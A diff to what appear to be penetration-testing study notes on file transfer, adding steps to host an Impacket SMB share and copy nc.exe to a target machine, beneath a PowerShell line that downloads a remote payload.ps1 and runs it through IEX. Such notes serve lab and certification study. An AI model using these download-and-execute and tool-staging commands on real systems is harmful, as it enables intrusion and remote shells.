@@ -63,3 +63,23 @@ $client.DownloadString("10.10.10.16/paYLOAD.ps1") | IEX
 ```
 
 - [ ] SMB DOWNLOADS
+CREATE THE SMB SERVER THROUGH IMPACKET 
+```
+sudo impacket-smbserver share -smb2support /tmp/smbshare
+```
+copy the files from the server 
+```
+copy \\10.10.10.10\share\nc.exe
+```
+specify username and password 
+```
+sudo impacket-smbserver share -smb2support /tmp/smbshare -user user -password pass
+```
+then mount with creds
+```
+net use n: \\10.10.10.10\share /user:user pass
+```
+then copy
+```
+copy n:\nc.exe
+```
